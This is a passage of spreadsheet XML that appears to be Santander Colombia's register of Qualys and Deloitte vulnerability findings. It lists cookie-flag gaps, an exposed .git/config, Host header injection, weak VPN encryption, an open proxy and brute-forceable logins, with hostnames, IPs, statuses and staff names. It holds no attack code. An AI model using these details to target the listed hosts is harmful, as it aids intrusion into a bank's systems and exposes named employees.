    <s v="Solved"/>
    <x v="1"/>
    <n v="6.5"/>
    <m/>
    <m/>
    <s v="www.santander.com.co/Web/Login.aspx?ReturnUrl=%2FWeb%2F"/>
    <m/>
    <m/>
    <d v="2023-04-15T00:00:00"/>
    <n v="1165"/>
    <d v="2023-07-14T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2024-06-28T00:00:00"/>
    <s v="La aplicación web utiliza una o varias bibliotecas JavaScript que contienen una vulnerabilidad conocida._x000a__x000a_https://www.santander.com.co/Web/Login.aspx?ReturnUrl=%2FWeb%2F"/>
    <s v="Consulte los avisos de seguridad del proveedor relacionados con la versión vulnerable de la biblioteca."/>
    <m/>
    <d v="2023-09-30T00:00:00"/>
    <s v="Fecha de decomiso:_x000a__x000a_31/12/2023"/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="232"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Supernet"/>
    <s v="QA-WAS-82dc204a-5102-42ec-9e71-b4ecbdec7d46"/>
    <m/>
    <x v="59"/>
    <m/>
    <s v="Dismissed"/>
    <x v="1"/>
    <n v="5.3"/>
    <m/>
    <m/>
    <s v="www.santander.com.co/Web/Login.aspx?ReturnUrl=%2FWeb%2F"/>
    <m/>
    <m/>
    <d v="2023-04-15T00:00:00"/>
    <n v="1165"/>
    <d v="2023-07-14T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2023-07-17T00:00:00"/>
    <s v="Se descubrió un archivo, directorio o listado de directorios potencialmente sensible en el servidor Web._x000a__x000a_https://www.santander.com.co/Web/Login.aspx?ReturnUrl=%2fWeb%2fApp_Themes%2fLogin%2fWebService%2f"/>
    <s v="Compruebe que el acceso a este archivo o directorio está permitido. Si es necesario, elimínelo o aplíquele controles de acceso."/>
    <m/>
    <m/>
    <s v="Falso positivo"/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="233"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Portal Web"/>
    <s v="QA-WAS-53b3624d-2d32-4f1a-aa08-4e0d17873e6c"/>
    <m/>
    <x v="73"/>
    <m/>
    <s v="Active"/>
    <x v="1"/>
    <n v="4.3"/>
    <m/>
    <m/>
    <s v="www.santander.com.co"/>
    <m/>
    <m/>
    <d v="2023-04-15T00:00:00"/>
    <n v="1165"/>
    <d v="2023-07-14T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="La cookie no contiene el atributo HTTPOnly._x000a__x000a_https://www.santander.com.co/"/>
    <s v="Si el riesgo asociado de una cuenta comprometida es alto, aplique el atributo HTTPOnly a las cookies."/>
    <m/>
    <s v="Pre:_x000a_1° Fecha: 23/08/2024_x000a__x000a_Pro:_x000a_1° Fecha: 30/09/2024"/>
    <s v="Se realizará validación con el equipo de SDS México para revisar como podemos hacer la implementación"/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="234"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Portal Web"/>
    <s v="QA-WAS-5789806b-30dd-4079-bb72-b510e54eeaa6"/>
    <m/>
    <x v="74"/>
    <m/>
    <s v="Active"/>
    <x v="1"/>
    <n v="4.3"/>
    <m/>
    <m/>
    <s v="www.santander.com.co"/>
    <m/>
    <m/>
    <d v="2023-04-15T00:00:00"/>
    <n v="1165"/>
    <d v="2023-07-14T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="La cookie no contiene el atributo secure_x000a__x000a_https://www.santander.com.co/"/>
    <s v="Si el riesgo asociado de una cuenta comprometida es alto, aplique el atributo seguro a las cookies y obligue a que todas las solicitudes sensibles se envíen a través de HTTPS."/>
    <m/>
    <s v="Pre:_x000a_1° Fecha: 23/08/2024_x000a__x000a_Pro:_x000a_1° Fecha: 30/09/2024"/>
    <s v="Se realizará validación con el equipo de SDS México para revisar como podemos hacer la implementación"/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="235"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Portal Web"/>
    <s v="QA-WAS-1ef6b681-2f6a-4c62-b7db-3efdf56a1f97"/>
    <m/>
    <x v="59"/>
    <m/>
    <s v="Dismissed"/>
    <x v="1"/>
    <n v="5.3"/>
    <m/>
    <m/>
    <s v="www.santander.com.co"/>
    <m/>
    <m/>
    <d v="2023-06-30T00:00:00"/>
    <n v="1089"/>
    <d v="2023-09-28T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2024-09-20T00:00:00"/>
    <s v="Se descubrió un archivo, directorio o listado de directorios potencialmente sensible en el servidor _x000a__x000a_https://www.santander.com.co/.git/config"/>
    <s v="Compruebe que el acceso a este archivo o directorio está permitido. Si es necesario, elimínelo o aplíquele controles de acceso."/>
    <m/>
    <s v="Pre:_x000a_1° Fecha: 16/08/2024_x000a__x000a_Pro:_x000a_1° Fecha: 21/09/2024"/>
    <s v="En revisión falso positivo_x000a_RITM011127883"/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="236"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Supernet/Empresas"/>
    <s v="QA-WAS-890c1a25-09fc-4a8c-a657-964bc12305b2"/>
    <m/>
    <x v="73"/>
    <m/>
    <s v="Active"/>
    <x v="1"/>
    <n v="4.3"/>
    <m/>
    <m/>
    <s v="https://www.santander.com.co/Empresas/"/>
    <m/>
    <m/>
    <d v="2023-04-15T00:00:00"/>
    <n v="1165"/>
    <d v="2023-07-14T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="La cookie no contiene el atributo HTTPOnly._x000a__x000a_https://www.santander.com.co/Empresas/"/>
    <s v="Si el riesgo asociado de una cuenta comprometida es alto, aplique el atributo HTTPOnly a las cookies."/>
    <m/>
    <s v="Sin definir"/>
    <m/>
    <s v="Juan David Cuesta"/>
  </r>
  <r>
    <n v="237"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="VPN"/>
    <s v="QA-WAS-7f958928-4369-42b5-a250-f646ac8b4a7e"/>
    <m/>
    <x v="123"/>
    <m/>
    <s v="Solved"/>
    <x v="1"/>
    <n v="5.3"/>
    <m/>
    <n v="190242107210"/>
    <s v="vpnco2.santander.com.co"/>
    <m/>
    <m/>
    <d v="2023-05-13T00:00:00"/>
    <n v="1137"/>
    <d v="2023-08-11T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Se descubrió un archivo, directorio o listado de directorios potencialmente sensible en el servidor Web._x000a__x000a_https://vpnco2.santander.com.co/+CSCOE+/message.html?mc=2"/>
    <s v="Compruebe que el acceso a este archivo o directorio está permitido. Si es necesario, elimínelo o aplíquele controles de acceso."/>
    <m/>
    <s v="Sin definir"/>
    <s v="Escalado: 26/07/2023"/>
    <s v="Angie Cubillos"/>
  </r>
  <r>
    <n v="238"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <m/>
    <m/>
    <m/>
    <s v="VPN"/>
    <s v="QA-VM--2640472995955208740"/>
    <m/>
    <x v="124"/>
    <m/>
    <s v="Dismissed"/>
    <x v="1"/>
    <m/>
    <m/>
    <s v="170.169.127.22"/>
    <s v="vpnbsnc.santander.com.co"/>
    <m/>
    <n v="500"/>
    <d v="2023-04-15T00:00:00"/>
    <n v="1165"/>
    <d v="2023-07-14T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2024-09-20T00:00:00"/>
    <s v="Este host contiene un servidor de intercambio de claves ISAKMP/IKE para negociar claves de cifrado para Redes Privadas Virtuales (VPNs) IPsec. La configuración del servidor permite a los clientes establecer conexiones VPN con configuraciones de cifrado o longitudes de clave inseguras. Una vez establecidas, estas conexiones pueden permitir a usuarios remotos malintencionados con acceso al flujo de datos de la VPN recuperar la clave de sesión utilizada en la conexión realizando búsquedas de fuerza bruta en el espacio de claves._x000a_Nota:  _x000a_Este QID será reportado como una Vulnerabilidad Potencial (no como una Vulnerabilidad)_x000a_en algunas versiones de IOS porque un ISAKMP SA con configuraciones débiles puede ser_x000a_establecida primero, y rechazada después por una comprobación de políticas. Sin_x000a_tener credenciales de autenticación VPN, es imposible diferenciar_x000a_entre este tipo de configuración y una configuración que realmente permite ISAKMP SA con_x000a_débil _x000a_débiles._x000a__x000a_Algoritmo: DES_x000a__x000a_Descripción: Data_Encryption_Standard_(56_bits)"/>
    <s v="esactive el algoritmo de cifrado &quot;DES&quot; (longitud de clave de 56 bits) y el algoritmo de intercambio de claves DH768 (MODP768). Los sustitutos seguros son 3DES y DH2048._x000a_MSFT tiene más detalles en Microsoft Guidance_x000a__x000a_https://technet.microsoft.com/library/cc776369.aspx"/>
    <s v="Un usuario malintencionado con acceso al flujo de datos de la VPN puede ser capaz de recuperar la clave de sesión de una conexión VPN. Esto le daría acceso a todos los datos enviados a través de la conexión VPN, que pueden incluir contraseñas y archivos confidenciales."/>
    <s v="Sin definir"/>
    <s v="RITM011128055_x000a_Escalado: 26/07/2023"/>
    <s v="Victor Andres Aragon Valencia"/>
  </r>
  <r>
    <n v="239"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="API Prospera"/>
    <s v="QA-WAS-83de7cee-1208-4119-9604-31ee90432e67"/>
    <m/>
    <x v="125"/>
    <m/>
    <s v="Solved"/>
    <x v="4"/>
    <m/>
    <m/>
    <m/>
    <s v="https://prospera.santanderconsumer.co"/>
    <m/>
    <m/>
    <d v="2023-08-04T00:00:00"/>
    <n v="1054"/>
    <d v="2023-09-03T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2023-09-08T00:00:00"/>
    <s v="La cabecera Host es una cabecera de petición HTTP que especifica el nombre de dominio del servidor con el que el cliente intenta comunicarse. Permite a un único servidor web alojar varios sitios web distinguiendo entre ellos en función del nombre de dominio proporcionado en la cabecera Host._x000a__x000a_La inyección del encabezado Host es una vulnerabilidad de seguridad que se produce cuando un atacante manipula el encabezado Host en una petición HTTP para inyectar datos maliciosos. Al hacerlo, el atacante puede engañar al servidor web para que procese la solicitud como si estuviera dirigida a un dominio diferente. Esto puede dar lugar a varios tipos de ataques, como desfiguración de sitios web, secuestro de sesiones y secuencias de comandos en sitios cruzados (XSS)._x000a__x000a_Lógica de detección de QID:_x000a_Este QID envía una petición HTTP con la carga útil en la cabecera Host para comprobar si el objetivo es vulnerable._x000a__x000a_https://prospera.santanderconsumer.co/testlabwest2022/users"/>
    <s v="Para mitigar los riesgos de la inyección de encabezados de host, es esencial implementar una validación y un saneamiento adecuados de los encabezados de entrada."/>
    <m/>
    <s v="Sin definir"/>
    <m/>
    <s v="Martha Johanna Sanchez Sanchez"/>
  </r>
  <r>
    <n v="240"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Portal Web"/>
    <s v="QA-WAS-e8bd68a8-8453-4cac-916c-04b7dae26ce4"/>
    <m/>
    <x v="125"/>
    <m/>
    <s v="Solved"/>
    <x v="4"/>
    <m/>
    <m/>
    <m/>
    <s v="www.santander.com.co/Web/Login.aspx?ReturnUrl=%2FWeb%2F"/>
    <m/>
    <m/>
    <d v="2023-08-04T00:00:00"/>
    <n v="1054"/>
    <d v="2023-09-03T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2023-09-08T00:00:00"/>
    <s v="La cabecera Host es una cabecera de petición HTTP que especifica el nombre de dominio del servidor con el que el cliente intenta comunicarse. Permite a un único servidor web alojar varios sitios web distinguiendo entre ellos en función del nombre de dominio proporcionado en la cabecera Host._x000a__x000a_La inyección del encabezado Host es una vulnerabilidad de seguridad que se produce cuando un atacante manipula el encabezado Host en una petición HTTP para inyectar datos maliciosos. Al hacerlo, el atacante puede engañar al servidor web para que procese la solicitud como si estuviera dirigida a un dominio diferente. Esto puede dar lugar a varios tipos de ataques, como desfiguración de sitios web, secuestro de sesiones y secuencias de comandos en sitios cruzados (XSS)._x000a__x000a_Lógica de detección de QID:_x000a_Este QID envía una petición HTTP con la carga útil en la cabecera Host para comprobar si el objetivo es vulnerable._x000a__x000a_https://www.santander.com.co/testlabwest2022/users"/>
    <s v="Para mitigar los riesgos de la inyección de encabezados de host, es esencial implementar una validación y un saneamiento adecuados de los encabezados de entrada."/>
    <m/>
    <s v="Sin definir"/>
    <m/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="241"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Supernet"/>
    <s v="QA-WAS-04fabc3f-5d65-4d31-acee-99ee949c357c"/>
    <m/>
    <x v="76"/>
    <m/>
    <s v="Solved"/>
    <x v="1"/>
    <m/>
    <m/>
    <m/>
    <s v="https://www.santander.com.co/Web/Login.aspx?ReturnUrl=%2fWeb%2fPages%2fRequests%2fApp_Themes%2fLogin%2fadm%2f"/>
    <m/>
    <m/>
    <d v="2023-08-04T00:00:00"/>
    <n v="1054"/>
    <d v="2023-11-02T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2024-06-21T00:00:00"/>
    <s v="La página web puede enmarcarse. Esto significa que son posibles los ataques de clickjacking contra los usuarios._x000a__x000a_https://www.santander.com.co/Web/rb_d56b4438-db41-4f20-9ef1-29ccacb1c640?type=js3&amp;sn=v_4_srv_2_sn_1DF045946C36E5AF08761BA09B3E5506_perc_100000_ol_0_mul_1_app-3A11137600a3d63bf2_1&amp;svrid=2&amp;flavor=post&amp;vi=BKRRAKETCPFFMJLUAOGWDUCDGMOVNQUU-0&amp;modifiedSince=1681523675007&amp;rf=https%3A%2F%2Fwww.santander.com.co%2FWeb%2FLogin.aspx%3FReturnUrl%3D%252FWeb%252F&amp;bp=3&amp;app=11137600a3d63bf2&amp;crc=3711693313&amp;en=3a9l0fyd&amp;end=1"/>
    <s v="Entre los mecanismos habituales de prevención del clickjacking se incluyen:_x000a_X-Frame-Options: Se trata de una cabecera de respuesta HTTP que se utiliza para evitar el framing de la página web._x000a_Código JavaScript Framekiller: Se puede utilizar un código JS especial para impedir que un usuario malintencionado enmarque la página. Este método es menos fiable que el uso de X-Frame-Options."/>
    <m/>
    <s v="Sin definir"/>
    <s v="Fecha de decomiso:_x000a__x000a_31/12/2023"/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="242"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="VPN"/>
    <s v="QA-WAS-a98fe7f7-c1a4-4509-90ef-37dbf4c8a3d5"/>
    <m/>
    <x v="123"/>
    <m/>
    <s v="Solved"/>
    <x v="1"/>
    <n v="5.3"/>
    <m/>
    <m/>
    <s v="vpnco1.santander.com.co"/>
    <m/>
    <m/>
    <d v="2023-09-08T00:00:00"/>
    <n v="1019"/>
    <d v="2023-12-07T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Se descubrió un archivo, directorio o listado de directorios potencialmente sensible en el servidor_x000a__x000a_https://vpnco1.santander.com.co/+CSCOE+/message.html?mc=2"/>
    <s v="Compruebe que el acceso a este archivo o directorio está permitido. Si es necesario, elimínelo o aplíquele controles de acceso."/>
    <m/>
    <s v="Sin definir"/>
    <s v="Escalado: 26/07/2023"/>
    <s v="Victor Andres Aragon Valencia"/>
  </r>
  <r>
    <n v="243"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Portal Web"/>
    <s v="QA-WAS-260abe18-e185-4b8d-834f-1a4512aebba2"/>
    <m/>
    <x v="59"/>
    <m/>
    <s v="Solved"/>
    <x v="1"/>
    <n v="5.3"/>
    <m/>
    <m/>
    <s v="www.santander.com.co"/>
    <m/>
    <m/>
    <d v="2023-10-13T00:00:00"/>
    <n v="984"/>
    <d v="2024-01-11T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2023-11-03T00:00:00"/>
    <s v="Se descubrió un archivo, directorio o listado de directorios potencialmente sensible en el servidor_x000a__x000a_https://www.santander.com.co/pg/super-deposito-1801.html"/>
    <s v="Compruebe que el acceso a este archivo o directorio está permitido. Si es necesario, elimínelo o aplíquele controles de acceso."/>
    <m/>
    <s v="Sin definir"/>
    <m/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="244"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <m/>
    <m/>
    <m/>
    <s v="API Prospera"/>
    <s v="QA-VM--6209432925000874056"/>
    <m/>
    <x v="126"/>
    <m/>
    <s v="Dismissed"/>
    <x v="1"/>
    <n v="5"/>
    <m/>
    <m/>
    <s v="prospera.santanderconsumer.co"/>
    <n v="80"/>
    <m/>
    <d v="2023-11-20T00:00:00"/>
    <n v="946"/>
    <d v="2024-02-18T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2023-12-07T00:00:00"/>
    <s v="Los usuarios de Internet no autorizados pueden conectarse a servicios arbitrarios utilizando el protocolo HTTP a través de este proxy. El escáner pudo conectarse a recursos externos en Internet a través de este proxy."/>
    <s v="Configura tu servidor proxy para que sólo permita conexiones de usuarios/hosts válidos dentro de tu red interna, o para que requiera autenticación para utilizar los servicios proxy. Si necesitas más ayuda sobre cómo hacerlo, ponte en contacto con el proveedor del software proxy."/>
    <m/>
    <m/>
    <s v="Falso positivo_x000a_RITM011117804"/>
    <s v="Martha Johanna Sanchez Sanchez"/>
  </r>
  <r>
    <n v="245"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <m/>
    <m/>
    <m/>
    <s v="Portal Web"/>
    <s v="QA-VM--16819350525993917"/>
    <m/>
    <x v="126"/>
    <m/>
    <s v="Dismissed"/>
    <x v="1"/>
    <n v="5"/>
    <m/>
    <m/>
    <s v="www.santander.com.co"/>
    <n v="80"/>
    <m/>
    <d v="2023-11-20T00:00:00"/>
    <n v="946"/>
    <d v="2024-02-18T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2023-12-07T00:00:00"/>
    <s v="Los usuarios de Internet no autorizados pueden conectarse a servicios arbitrarios utilizando el protocolo HTTP a través de este proxy. El escáner pudo conectarse a recursos externos en Internet a través de este proxy."/>
    <s v="Configura tu servidor proxy para que sólo permita conexiones de usuarios/hosts válidos dentro de tu red interna, o para que requiera autenticación para utilizar los servicios proxy. Si necesitas más ayuda sobre cómo hacerlo, ponte en contacto con el proveedor del software proxy."/>
    <m/>
    <m/>
    <s v="Falso positivo_x000a_RITM011117804"/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="246"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Supernet"/>
    <s v="QA-WAS-f83572eb-32b2-4df9-baa6-b73f948f6df9"/>
    <m/>
    <x v="59"/>
    <m/>
    <s v="Solved"/>
    <x v="1"/>
    <n v="5.3"/>
    <m/>
    <m/>
    <s v="https://www.santander.com.co/Web/Login.aspx?ReturnUrl=%2fWeb%2fPages%2fRequests%2fApp_Themes%2fLogin%2fadm%2f"/>
    <n v="443"/>
    <m/>
    <d v="2023-11-20T00:00:00"/>
    <n v="946"/>
    <d v="2024-02-18T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2023-11-17T00:00:00"/>
    <s v="Se descubrió un archivo, directorio o listado de directorios potencialmente sensible en el servidor Web."/>
    <s v="Compruebe que el acceso a este archivo o directorio está permitido. Si es necesario, elimínelo o aplíquele controles de acceso."/>
    <m/>
    <s v="Sin definir"/>
    <m/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="247"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Supernet"/>
    <s v="MX-QAF-003-014"/>
    <m/>
    <x v="117"/>
    <m/>
    <s v="Solved"/>
    <x v="1"/>
    <n v="5"/>
    <m/>
    <s v="170.169.33.50"/>
    <s v="https://www.santander.com.co/Web/Login.aspx?ReturnUrl=%2fWeb%2fPages%2fRequests%2fApp_Themes%2fLogin%2fadm%2f"/>
    <n v="443"/>
    <m/>
    <d v="2013-11-20T00:00:00"/>
    <n v="4598"/>
    <d v="2014-02-18T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2023-12-13T00:00:00"/>
    <s v="Se ha observado una página por defecto, propia de la instalación del servicio web o de paquetes software asociados a los recursos afectados. Path: https://www.santander.com.co/Web/ScriptResource.axd"/>
    <s v="Se deben controlar todas las entradas o valores que el aplicativo recibe por parte del cliente, y realizar un tratamiento seguro de sus valores evitando proporcionar información útil a un posible atacante. Adicionalmente para no proporcionar información al atacante se recomienda personalizar las páginas de error para que no sean descriptivas."/>
    <s v="Al introducir caracteres no esperados en los parámetros recibidos por la aplicación esta devuelve errores no controlados que aportan información acerca de la arquitectura utilizada."/>
    <m/>
    <s v="Certificada"/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="248"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Supernet"/>
    <s v="MX-QAF-004-014"/>
    <m/>
    <x v="127"/>
    <m/>
    <s v="Solved"/>
    <x v="1"/>
    <n v="6.8"/>
    <m/>
    <s v="170.169.33.50"/>
    <m/>
    <n v="443"/>
    <m/>
    <d v="2013-11-20T00:00:00"/>
    <n v="4598"/>
    <d v="2014-02-18T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2023-12-13T00:00:00"/>
    <s v="Los servidores Web utilizan ciertos métodos o funciones propias del protocolo HTTP para funcionar; siendo los más utilizados GET; POST y HEAD. Como resultado del análisis de los servicios Web internos; se ha detectado que los recursos afectados permiten utilizar métodos HTTP adicionales (OPTIONS); los cuales podrían no ser requeridos; debilitando la seguridad de dichos servicios Web._x000a__x000a_Los servidores Web utilizan ciertos métodos o funciones propias del protocolo HTTP para funcionar siendo los más utilizados GET POST y HEAD. Como resultado del análisis de los servicios Web internos se ha detectado que los recursos afectados permiten utilizar métodos HTTP adicionales (OPTIONS TRACE GET HEAD DELETE PUT POST COPY MOVE MKCOL PROPFIND PROPPATCH LOCK UNLOCK SEARCH) los cuales podrían no ser requeridos debilitando la seguridad de dichos servicios Web."/>
    <s v="Se recomienda evaluar la necesidad de utilizar todos los métodos que se encuentran actualmente disponibles en los servidores web; y en caso de identificar métodos no requeridos; los mismos deberían ser deshabilitados._x000a__x000a_La solución depende de la infraestructura: En Apache: Las nuevas versiones de Apache (1.3.34, 2.0.55 y posterior) tienen una directiva denominada TraceEnable: TraceEnable off Para versiones anteriores, se recomienda utilizar el módulo mod_rewrite: RewriteEngine On RewriteCond %{REQUEST_METHOD} ^TRACE RewriteRule .* - [F] En IIS, PWS, Microsoft-IIS, Internet Information Server, Internet Information Services, Microsoft-PWS: Se recomienda utilizar la herramienta URLScan: http://www.microsoft.com/technet/security/tools/urlscan.mspx Java System Web Server, SunONE WebServer, Sun-ONE-Web-Server, iPlanet Se recomienda aplicar la siguiente configuración en el fichero 'obj.conf' : AuthTrans fn=&quot;&quot;set-variable&quot;&quot; remove-headers=&quot;&quot;transfer-encoding&quot;&quot; set-headers=&quot;&quot;content-length: -1&quot;&quot; error=&quot;&quot;501&quot;&quot; Para Sun ONE/iPlanet Web Server anteriores a la versión v6.0 SP2, se recomienda seguir las siguientes instrucciones oficiales: http://sunsolve.sun.com/pub-cgi/retrieve.pl?doc=fsalert%2F50603 En Lotus Domino: Se recomienda añadir la siguiente directiva en el fichero NOTES.INI: HTTPDisableMethods=TRACE"/>
    <s v="Los métodos HTTP anteriormente expuestos podrían permitir a un atacante realizar distintas acciones en el servidor, como ser la creación y/o eliminación de información."/>
    <m/>
    <s v="Certificada"/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="249"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Supernet"/>
    <s v="MX-QAF-018-001"/>
    <m/>
    <x v="128"/>
    <m/>
    <s v="Solved"/>
    <x v="1"/>
    <n v="5"/>
    <m/>
    <s v="170.169.33.50"/>
    <m/>
    <n v="443"/>
    <m/>
    <d v="2013-11-20T00:00:00"/>
    <n v="4598"/>
    <d v="2014-02-18T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2023-12-13T00:00:00"/>
    <s v="Se ha detectado la presencia de cabeceras http identificativas de servidor web y sistema operativo: Server: Microsoft IIS/7.5 X-Powered-By: ASP.NET _x000a__x000a_"/>
    <s v="Para solucionar los problemas de identificación de plataforma hay que: 1.Controlar los errores de las aplicaciones y mostrar errores genéricos. _x000a_2. Controlar los errores del servidor y mostrar errores genéricos. _x000a_3. Cambiar las cabeceras enviadas por los servidores web. Seguir leyendo para más información. _x000a_4. Modificación de las cabeceras de los servidores web: Internet Information Server (IIS) Debido a lo extenso de la explicación no se expondrá en este documento, pero se puede consultar una guía paso a paso sobre cómo modificar las cabeceras para evitar la identificación de la plataformas en: http://www.4guysfromrolla.com/articles/120209-1.aspx Apache Para evitar que apache envíe las cabeceras siga los siguientes pasos: _x000a_1. Abra su archivo de configuración de Apache (httpd.conf). _x000a_2. En la sección de configuración general, añada la siguiente sentencia: ServerSignature Off"/>
    <s v="Mostrar información sensible como el versionado del servidor web ofrece información de gran utilidad a un potencial atacante que podría enfocar los intentos de explotación hacia las vulnerabilidades existentes en esa versión de servidor concreta. La explotación se consigue mediante el envío de una petición HTTP. La respuesta por parte del servidor contiene una cabecera HTTP que muestra la versión del servicio Web utilizado."/>
    <m/>
    <s v="Certificada"/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="250"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Supernet"/>
    <s v="MX-QAF-027-001"/>
    <m/>
    <x v="129"/>
    <m/>
    <s v="Solved"/>
    <x v="1"/>
    <n v="4.3"/>
    <m/>
    <s v="170.169.33.50"/>
    <s v="https://www.santander.com.co/Web/Login.aspx?ReturnUrl=%2fWeb%2fPages%2fRequests%2fApp_Themes%2fLogin%2fadm%2f"/>
    <n v="443"/>
    <m/>
    <d v="2013-11-20T00:00:00"/>
    <n v="4598"/>
    <d v="2014-02-18T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2023-12-13T00:00:00"/>
    <s v="Se ha identificado que el recurso afectado es vulnerable al envío masivo de mensajes, al no implementarse mecanismos que impidan o dificulten la utilización de herramientas automatizadas en el formulario de &quot;registro en línea&quot;. URL afectada: https://www.santander.com.co/Web/Pages/Requests/RequestServices_Step2.aspx_x000a__x000a_Se recomienda implementar en los recursos afectados, mecanismos que dificulten la automatización de envío de correos electrónicos. Para ello, se pueden implementar mecanismos de CAPTCHA que sigan las siguientes directrices: - La validación del desafío se realizará en el servidor. - No se transmitirá al cliente información que pueda facilitar la resolución del desafío (nombres de archivo e imágenes, validación en el lado cliente, etc.). - El CAPTCHA mostrado deberá ser elegido aleatoriamente y de forma no predecible. - Los CAPTCHAS utilizados deberán tener caracteres rotados. - Los CAPTCHAS utilizados deberán tener caracteres de distintas alturas y tamaños. - Los CAPTCHAS utilizados deberán tener caracteres de diferentes colores. - Los CAPTCHAS utilizados deberán tener caracteres deformados. - Los CAPTCHAS utilizados deberán tener caracteres tachados."/>
    <s v="Se recomienda implementar mecanismos que dificulten la automatización del proceso de envío de mensajes, como podría ser la utilización de CAPTCHAS, que requieran la intervención del usuario en el proceso."/>
    <s v="La observación identificada podría permitir a un usuario malicioso colapsar la bandeja de entrada del servicio, lo que podría converger en el peor de los casos en una Denegación de Servicio."/>
    <m/>
    <s v="Certificada"/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="251"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Supernet"/>
    <s v="MX-QAF-074-005"/>
    <m/>
    <x v="130"/>
    <m/>
    <s v="Solved"/>
    <x v="1"/>
    <n v="5"/>
    <m/>
    <s v="170.169.33.50"/>
    <s v="https://www.santander.com.co/Web/Login.aspx?ReturnUrl=%2fWeb%2fPages%2fRequests%2fApp_Themes%2fLogin%2fadm%2f"/>
    <n v="443"/>
    <m/>
    <d v="2013-11-20T00:00:00"/>
    <n v="4598"/>
    <d v="2014-02-18T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2023-12-13T00:00:00"/>
    <s v="S ha observado que los formularios de login de los recursos especificado son susceptibles de sufrir ataques de fuerza bruta, ya que no limitan los intentos de acceso o muestran información de relevancia para la enumeración de usuarios. URL afectadas: https://www.santander.com.co/Web/Login.aspx _x000a__x000a_Una de las opciones para impedir ataques de fuerza bruta es utilizar restricciones como las que ofrecen los captchas."/>
